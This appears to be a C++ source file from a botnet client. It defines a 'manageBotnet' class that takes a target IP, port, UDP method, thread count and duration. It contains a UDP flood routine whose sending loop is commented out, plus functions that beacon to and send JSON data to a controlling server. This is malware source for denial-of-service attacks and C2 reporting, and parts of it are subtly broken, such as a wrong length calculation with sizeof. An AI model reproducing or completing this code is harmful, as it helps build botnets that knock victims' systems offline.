#include "attack.h"


manageBotnet::manageBotnet(int port_, std::string ip, std::string method, int thread, int time) {
    if (port_ < 0 || port_ > 65535) {
        error("error 504", "not correct port");
    }
	this->port_ = port_;

    if (inet_addr(ip.c_str()) == INADDR_NONE) {
        error("error 345", "incorrect ip");
    }
	this->ip = ip;

    if (method != "UDP") {
        error("error 122", "invalid method");
    }
	this->method = method;

    try{
        this->thread = thread;
    }catch (const std::exception&){
        error("error 983", "invalid thread");
    }


    try{
        this->time = time;
    }catch (const std::exception&){
        error("error 983", "invalid time");
    }
}


void manageBotnet::udpSpam() {
    sock_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int bytesSent;
    if (sock_ == INVALID_SOCKET) {
        error("error 4", "invalid socket");
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    //for (int i = 0; i < thread; i++) {
        //std::thread Thread1(bytesSent = sendto(sock_, buffer, sizeof(buffer) / sizeof(char), 0, (struct sockaddr*)&addr, sizeof(addr)));
        //Thread1.detach();
    //}

    //if (bytesSent == -1) {
      //  errorNotStop("error 234", "bad sendto");
    //}

    closesocket(sock_);
    WSACleanup();
}


void manageBotnet::pingUser() {
    sock_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int bytesSent;
    if (sock_ == INVALID_SOCKET) {
        error("error 4", "invalid socket");
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(serverPort);
    addr.sin_addr.s_addr = inet_addr(serverIp.c_str());

    bytesSent = sendto(sock_, "1", sizeof("1") / sizeof(char), 0, (struct sockaddr*)&addr, sizeof(addr));

    if (bytesSent == -1) {
        errorNotStop("error 234", "bad sendto");
    }

    closesocket(sock_);
    WSACleanup();

}

void manageBotnet::sendInfo(nlohmann::json jsonData) {
    sock_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int bytesSent;

    if (sock_ == INVALID_SOCKET) {
        error("error 4", "invalid socket");
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(serverPort);
    addr.sin_addr.s_addr = inet_addr(serverIp.c_str());
    std::string jsonString = jsonData.dump();
    const char* bytes = jsonString.c_str();

    bytesSent = sendto(sock_, bytes, sizeof(jsonString) / sizeof(char), 0, (struct sockaddr*)&addr, sizeof(addr));

    if (bytesSent == -1) {
        errorNotStop("error 234", "bad sendto");
    }

    closesocket(sock_);
    WSACleanup();
}